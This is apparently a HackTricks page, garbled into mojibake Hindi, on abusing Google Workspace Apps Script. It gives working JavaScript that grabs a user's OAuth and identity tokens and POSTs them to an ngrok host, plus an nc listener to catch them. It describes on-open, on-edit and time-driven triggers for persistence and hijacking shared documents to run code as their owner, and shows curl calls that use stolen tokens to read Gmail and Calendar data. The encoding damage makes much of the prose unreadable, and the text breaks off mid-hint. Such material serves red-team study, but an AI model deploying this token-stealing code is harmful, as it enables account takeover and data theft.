# GWS - App Scripts

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ.

</details>

## App Scripts

App Scripts **рдХреЛрдб рд╣реИ рдЬреЛ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрдЧрд╛ рдЬрдм рдХреЛрдИ рдпреВрдЬрд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ рдПрдбрд┐рдЯрд░ рдкрд░рдорд┐рд╢рди рд╣реИ рд╡рд╣ рдбреЙрдХреНрдпреВрдореЗрдВрдЯ рдПрдХреНрд╕реЗрд╕ рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ App Script рд▓рд┐рдВрдХ рд╣реИ** рдФрд░ **OAuth рдкреНрд░реЙрдореНрдкреНрдЯ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж**.\
рдЗрдиреНрд╣реЗрдВ рдпрд╣ рднреА рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рд╡реЗ **рдирд┐рд╢реНрдЪрд┐рдд рд╕рдордп рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдВ** App Script рдХреЗ рдорд╛рд▓рд┐рдХ рджреНрд╡рд╛рд░рд╛ (Persistence).

### Create App Script

App Script рдмрдирд╛рдиреЗ рдХреЗ рдХрдИ рддрд░реАрдХреЗ рд╣реИрдВ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╕рдмрд╕реЗ рдЖрдо рддрд░реАрдХреЗ рд╣реИрдВ **Google Document (рдХрд┐рд╕реА рднреА рдкреНрд░рдХрд╛рд░ рдХрд╛)** рд╕реЗ рдФрд░ рдПрдХ **standalone project** рдХреЗ рд░реВрдк рдореЗрдВ:

<details>

<summary>Google Docs, Sheets, рдпрд╛ Slides рд╕реЗ container-bound project рдмрдирд╛рдПрдВ</summary>

1. Docs рдбреЙрдХреНрдпреВрдореЗрдВрдЯ, Sheets рд╕реНрдкреНрд░реЗрдбрд╢реАрдЯ, рдпрд╛ Slides рдкреНрд░реЗрдЬреЗрдВрдЯреЗрд╢рди рдЦреЛрд▓реЗрдВ.
2. Click **Extensions** > **Google Apps Script**.
3. рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдПрдбрд┐рдЯрд░ рдореЗрдВ, click **Untitled project**.
4. рдЕрдкрдиреЗ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЛ рдирд╛рдо рджреЗрдВ рдФрд░ click **Rename**.

</details>

<details>

<summary>Standalone project рдмрдирд╛рдПрдВ</summary>

Apps Script рд╕реЗ standalone project рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП:

1. [`script.google.com`](https://script.google.com/) рдкрд░ рдЬрд╛рдПрдВ.
2. Click add **New Project**.
3. рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдПрдбрд┐рдЯрд░ рдореЗрдВ, click **Untitled project**.
4. рдЕрдкрдиреЗ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЛ рдирд╛рдо рджреЗрдВ рдФрд░ click **Rename**.

</details>

<details>

<summary>Google Drive рд╕реЗ Standalone project рдмрдирд╛рдПрдВ</summary>

1. [Google Drive](https://drive.google.com/) рдЦреЛрд▓реЗрдВ.
2. Click **New** > **More** > **Google Apps Script**.

</details>

<details>

<summary>Google Forms рд╕реЗ container-bound project рдмрдирд╛рдПрдВ</summary>

1. Google Forms рдореЗрдВ рдПрдХ рдлреЙрд░реНрдо рдЦреЛрд▓реЗрдВ.
2. Click More more\_vert > **Script editor**.
3. рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдПрдбрд┐рдЯрд░ рдореЗрдВ, click **Untitled project**.
4. рдЕрдкрдиреЗ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЛ рдирд╛рдо рджреЗрдВ рдФрд░ click **Rename**.

</details>

<details>

<summary>clasp command line tool рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ Standalone project рдмрдирд╛рдПрдВ</summary>

`clasp` рдПрдХ command line tool рд╣реИ рдЬреЛ рдЖрдкрдХреЛ рдЯрд░реНрдорд┐рдирд▓ рд╕реЗ Apps Script рдкреНрд░реЛрдЬреЗрдХреНрдЯреНрд╕ рдмрдирд╛рдиреЗ, pull/push рдХрд░рдиреЗ, рдФрд░ deploy рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ.

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [Command Line Interface using `clasp` guide](https://developers.google.com/apps-script/guides/clasp) рджреЗрдЦреЗрдВ.

</details>

## App Script Scenario <a href="#create-using-clasp" id="create-using-clasp"></a>

### Google Sheet рдХреЗ рд╕рд╛рде App Script рдмрдирд╛рдПрдВ

App Script рдмрдирд╛рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ, рдЗрд╕ рд╕реАрдирд╛рд░рд┐рдпреЛ рдХреЗ рд▓рд┐рдП рдореЗрд░реА рд╕рд┐рдлрд╛рд░рд┐рд╢ рд╣реИ рдХрд┐ Google Sheet рдмрдирд╛рдПрдВ рдФрд░ рдЬрд╛рдПрдВ **`Extensions > App Scripts`**, рдпрд╣ рдЖрдкрдХреЗ рд▓рд┐рдП рд╢реАрдЯ рд╕реЗ рд▓рд┐рдВрдХ рдХреА рдЧрдИ **рдирдИ App Script рдЦреЛрд▓реЗрдЧрд╛**.

### Leak token

OAuth рдЯреЛрдХрди рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **`Services +` рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдЬреИрд╕реЗ рд╕реНрдХреЛрдкреНрд╕ рдЬреЛрдбрд╝рдиреЗ рд╣реЛрдВрдЧреЗ**:

* **AdminDirectory**: рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЗ рдпреВрдЬрд░реНрд╕ рдФрд░ рдЧреНрд░реБрдкреНрд╕ рддрдХ рдкрд╣реБрдВрдЪ (рдЕрдЧрд░ рдпреВрдЬрд░ рдХреЗ рдкрд╛рд╕ рдкрд░реНрдпрд╛рдкреНрдд рдкрд░рдорд┐рд╢рди рд╣реИ)
* **Gmail**: Gmail рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП
* **Drive**: Drive рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП
* **Google Sheets API**: рддрд╛рдХрд┐ рдпрд╣ рдЯреНрд░рд┐рдЧрд░ рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░реЗ

рдЖрдкрдХреЛ рдЬрд░реВрд░реА **рд╕реНрдХреЛрдкреНрд╕ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП** рдЖрдк рдкреНрд░реЛрдЬреЗрдХреНрдЯ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдореЗрдВ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **enable S`how "appsscript.json" manifest file in editor`.**

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
```
рдЕрдиреБрд░реЛрдз рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдмрд╕ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
App Script рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдзрд┐рдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ:

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
рдЬреИрд╕реЗ рд╣реА рдПрдХ рдмрд╛рд╣рд░реА рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, OAuth рдкреНрд░реЙрдореНрдкреНрдЯ рднреА **рдмрд╛рд╣рд░реА рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд╛рдВрдЧреЗрдЧрд╛**ред
{% endhint %}

### рдЯреНрд░рд┐рдЧрд░ рдмрдирд╛рдПрдБ

рдПрдХ рдмрд╛рд░ рдЬрдм App рддреИрдпрд╛рд░ рд╣реЛ рдЬрд╛рдП, рддреЛ **тП░ рдЯреНрд░рд┐рдЧрд░реНрд╕** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдХреЗ рдПрдХ рдЯреНрд░рд┐рдЧрд░ рдмрдирд╛рдПрдБред **рдлрдВрдХреНрд╢рди** рдХреЗ рд░реВрдк рдореЗрдВ **`getToken`** рдЪреБрдиреЗрдВ, рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ **`Head`** рдкрд░ рдЪрд▓рд╛рдПрдБ, рдЗрд╡реЗрдВрдЯ рд╕реЛрд░реНрд╕ рдореЗрдВ **`From spreadsheet`** рдЪреБрдиреЗрдВ рдФрд░ рдЗрд╡реЗрдВрдЯ рдкреНрд░рдХрд╛рд░ рдореЗрдВ **`On open`** рдпрд╛ **`On edit`** (рдЖрдкрдХреА рдЬрд░реВрд░рдд рдХреЗ рдЕрдиреБрд╕рд╛рд░) рдЪреБрдиреЗрдВ рдФрд░ рд╕реЗрд╡ рдХрд░реЗрдВред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рдХреБрдЫ рдбрд┐рдмрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдЖрдк **App Scripts рдХреЗ рд░рдиреНрд╕ рдХреЛ Executions рдЯреИрдм рдореЗрдВ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ**ред

### рд╕рд╛рдЭрд╛ рдХрд░рдирд╛

**App Script** рдХреЛ **рдЯреНрд░рд┐рдЧрд░** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреАрдбрд╝рд┐рдд рдХреЛ **Editor Access** рдХреЗ рд╕рд╛рде рдХрдиреЗрдХреНрдЯ рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред

рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ, рдпрджрд┐ рдирд┐рд░реНрдорд╛рддрд╛ рдФрд░ рдЖрдордВрддреНрд░рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдПрдХ рд╣реА рд╕рдВрдЧрдарди рд╕реЗ рд╣реИрдВ** рддреЛ **OAuth** **рдЯреЛрдХрди** рдЙрд╕ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХрд╛ рд╣реЛрдЧрд╛ рдЬреЛ рдлрд╛рдЗрд▓ рддрдХ рдкрд╣реБрдБрдЪ рд░рд╣рд╛ рд╣реИред\
рдпрджрд┐ рд╡реЗ **рд╡рд┐рднрд┐рдиреНрди рд╕рдВрдЧрдардиреЛрдВ рд╕реЗ рд╣реИрдВ**, рддреЛ **рдЯреЛрдХрди** рд╣рдореЗрд╢рд╛ **рдЯреНрд░рд┐рдЧрд░ рдХреЗ рдирд┐рд░реНрдорд╛рддрд╛** рдХрд╛ рд╣реЛрдЧрд╛, рдХреЗрд╡рд▓ рдЙрдиреНрд╣реАрдВ OAuth рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдЬреЛ рдЯреНрд░рд┐рдЧрд░ рдмрдирд╛рддреЗ рд╕рдордп рджреА рдЧрдИ рдереАрдВред

{% hint style="success" %}
**App Script** рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ **рдЯреЛрдХрди** рд╡рд╣реА рд╣реЛрдЧрд╛ рдЬреЛ **рдЯреНрд░рд┐рдЧрд░ рдХреЗ рдирд┐рд░реНрдорд╛рддрд╛** рдХрд╛ рд╣реИ, рднрд▓реЗ рд╣реА рдлрд╛рдЗрд▓ рдХреЛ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ Editor рдХреЗ рд░реВрдк рдореЗрдВ рдЦреЛрд▓рд╛ рдЧрдпрд╛ рд╣реЛред
{% endhint %}

### 'Shared With Me' рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

{% hint style="danger" %}
рдпрджрд┐ рдХрд┐рд╕реА рдиреЗ рдЖрдкрдХреЗ рд╕рд╛рде рдПрдХ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕рд╛рдЭрд╛ рдХрд┐рдпрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ App Scripts рдФрд░ рдПрдХ рдЯреНрд░рд┐рдЧрд░ рд╣реИ рдЬреЛ App Script рдХреЗ **Head** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ (рдПрдХ рдирд┐рд╢реНрдЪрд┐рдд рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ рдирд╣реАрдВ), рддреЛ рдЖрдк App Script рдХреЛрдб рдореЗрдВ рд╕рдВрд╢реЛрдзрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЯреЛрдХрди рдЪреБрд░рд╛рдиреЗ рд╡рд╛рд▓реЗ рдлрдВрдХреНрд╢рди рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ), рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ **App Script рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХреА рдЬрд╛рдПрдЧреА рдЬрд┐рд╕рдиреЗ рдЖрдкрдХреЗ рд╕рд╛рде рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕рд╛рдЭрд╛ рдХрд┐рдпрд╛ рд╣реИ**! (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдорд╛рд▓рд┐рдХ рдХреЗ OAuth рдЯреЛрдХрди рдореЗрдВ рдЙрд╕ рд╕рдордп рджреА рдЧрдИ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рдЕрдиреБрд╕рд╛рд░ рд╣реА рдПрдХреНрд╕реЗрд╕ рд╕реНрдХреЛрдк рд╣реЛрдВрдЧреЗ)ред

**рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рдирд┐рд░реНрдорд╛рддрд╛ рдХреЛ рдПрдХ рд╕реВрдЪрдирд╛ рднреЗрдЬреА рдЬрд╛рдПрдЧреА рдЬрд┐рд╕рдореЗрдВ рдмрддрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдХрд┐ рдХрд┐рд╕реА рдиреЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рд╕рдВрд╢реЛрдзрди рдХрд┐рдпрд╛ рд╣реИ** (рдХреНрдпрд╛ рдЕрд▓рд░реНрдЯ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП gmail рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдлрд┐рд▓реНрдЯрд░ рдмрдирд╛рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реЛрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ?)
{% endhint %}

{% hint style="success" %}
рдпрджрд┐ рдХреЛрдИ **рд╣рдорд▓рд╛рд╡рд░ App Script рдХреЗ рд╕реНрдХреЛрдкреНрд╕ рдореЗрдВ рд╕рдВрд╢реЛрдзрди рдХрд░рддрд╛ рд╣реИ** рддреЛ рдЕрдкрдбреЗрдЯреНрд╕ **рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реЛрдВрдЧреЗ** рдЬрдм рддрдХ рдХрд┐ рдмрджрд▓рд╛рд╡реЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ **рдирдпрд╛ рдЯреНрд░рд┐рдЧрд░** рдирд╣реАрдВ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ред рдЗрд╕рд▓рд┐рдП, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдорд╛рд▓рд┐рдХ рдХреЗ рдирд┐рд░реНрдорд╛рддрд╛ рдЯреЛрдХрди рдХреЛ рдЙрд╕рд╕реЗ рдЕрдзрд┐рдХ рд╕реНрдХреЛрдкреНрд╕ рдХреЗ рд╕рд╛рде рдирд╣реАрдВ рдЪреБрд░рд╛ рдкрд╛рдПрдЧрд╛ рдЬрд┐рддрдирд╛ рдХрд┐ рдЙрд╕рдиреЗ рдЙрд╕ рдЯреНрд░рд┐рдЧрд░ рдореЗрдВ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдерд╛ рдЬреЛ рдЙрд╕рдиреЗ рдмрдирд╛рдпрд╛ рдерд╛ред
{% endhint %}

### рд╕рд╛рдЭрд╛ рдХрд░рдиреЗ рдХреЗ рдмрдЬрд╛рдп рдХреЙрдкреА рдХрд░рдирд╛

рдЬрдм рдЖрдк рдПрдХ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕рд╛рдЭрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд▓рд┐рдВрдХ рдмрдирд╛рддреЗ рд╣реИрдВ рддреЛ рдЗрд╕ рддрд░рд╣ рдХрд╛ рдПрдХ рд▓рд┐рдВрдХ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
рдпрджрд┐ рдЖрдк **рдЕрдВрдд рдореЗрдВ "/edit"** рдХреЛ **"/copy"** рд╕реЗ **рдмрджрд▓рддреЗ рд╣реИрдВ**, рддреЛ рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреЗ рдмрдЬрд╛рдп google рдЖрдкрд╕реЗ рдкреВрдЫреЗрдЧрд╛ рдХрд┐ рдХреНрдпрд╛ рдЖрдк **рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреА рдПрдХ рдкреНрд░рддрд┐ рдмрдирд╛рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ:**

<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрд╕реЗ рдХреЙрдкреА рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рддрд╛ рд╣реИ рддреЛ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреА **рд╕рд╛рдордЧреНрд░реА рдФрд░ App Scripts рджреЛрдиреЛрдВ рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрдирд╛рдИ рдЬрд╛рдПрдЧреА**, рд╣рд╛рд▓рд╛рдВрдХрд┐ **рдЯреНрд░рд┐рдЧрд░реНрд╕ рдирд╣реАрдВ рд╣реЛрдВрдЧреЗ**, рдЗрд╕рд▓рд┐рдП **рдХреБрдЫ рднреА рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдирд╣реАрдВ рд╣реЛрдЧрд╛**ред

### рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд░реВрдк рдореЗрдВ рд╕рд╛рдЭрд╛ рдХрд░рдирд╛

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **App Script рдХреЛ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд░реВрдк рдореЗрдВ рд╕рд╛рдЭрд╛ рдХрд░рдирд╛** рднреА рд╕рдВрднрд╡ рд╣реИ (App Script рдХреЗ рдПрдбрд┐рдЯрд░ рдореЗрдВ, рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд░реВрдк рдореЗрдВ рдбрд┐рдкреНрд▓реЙрдп рдХрд░реЗрдВ), рд▓реЗрдХрд┐рди рдЗрд╕ рддрд░рд╣ рдХрд╛ рдПрдХ рдЕрд▓рд░реНрдЯ рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛:

<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

рдЗрд╕рдХреЗ рдмрд╛рдж **рдЖрд╡рд╢реНрдпрдХ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдкреВрдЫрдиреЗ рд╡рд╛рд▓рд╛ рд╡рд┐рд╢рд┐рд╖реНрдЯ OAuth рдкреНрд░реЙрдореНрдкреНрдЯ** рдЖрдПрдЧрд╛ред

### рдкрд░реАрдХреНрд╖рдг

рдЖрдк рдИрдореЗрд▓реНрд╕ рдХреА рд╕реВрдЪреА рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХрддреНрд░рд┐рдд рдЯреЛрдХрди рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдХреИрд▓реЗрдВрдбрд░ рд╕реВрдЪреАрдмрджреНрдз рдХрд░реЗрдВ:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## App Script рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрдерд╛рдпрд┐рддреНрд╡

рд╕реНрдерд╛рдпрд┐рддреНрд╡ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рдХрд▓реНрдк рд╣реЛрдЧрд╛ **рдПрдХ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдмрдирд╛рдирд╛ рдФрд░ getToken рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдПрдХ рдЯреНрд░рд┐рдЧрд░ рдЬреЛрдбрд╝рдирд╛** рдФрд░ рдЙрд╕ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╕рд╛рде рд╕рд╛рдЭрд╛ рдХрд░рдирд╛ рддрд╛рдХрд┐ рдЬрдм рднреА рд╣рдорд▓рд╛рд╡рд░ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЦреЛрд▓реЗ рд╡рд╣ **рдкреАрдбрд╝рд┐рдд рдХрд╛ рдЯреЛрдХрди рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓реЗред**

рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдПрдХ App Script рдмрдирд╛рдИ рдЬрд╛рдП рдФрд░ рдЗрд╕реЗ рд╣рд░ X рд╕рдордп (рдЬреИрд╕реЗ рд╣рд░ рдорд┐рдирдЯ, рдШрдВрдЯрд╛, рджрд┐рди...) рдкрд░ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рдПред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдиреЗ **рдкреАрдбрд╝рд┐рдд рдХреА рд╕рд╛рдЦ рдпрд╛ рд╕рддреНрд░ рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд┐рдпрд╛ рд╣реИ, рд╡рд╣ рдПрдХ App Script рд╕рдордп рдЯреНрд░рд┐рдЧрд░ рд╕реЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд╣рд░ рджрд┐рди рдПрдХ рдмрд╣реБрдд рд╣реА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд OAuth рдЯреЛрдХрди рдХреЛ рд▓реАрдХ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**:

рдмрд╕ рдПрдХ App Script рдмрдирд╛рдПрдВ, Triggers рдкрд░ рдЬрд╛рдПрдВ, Add Trigger рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, рдФрд░ рдЗрд╡реЗрдВрдЯ рд╕реНрд░реЛрдд рдХреЗ рд░реВрдк рдореЗрдВ Time-driven рдЪреБрдиреЗрдВ рдФрд░ рдЖрдкрдХреЗ рд▓рд┐рдП рдмреЗрд╣рддрд░ рд╕реВрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ:

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
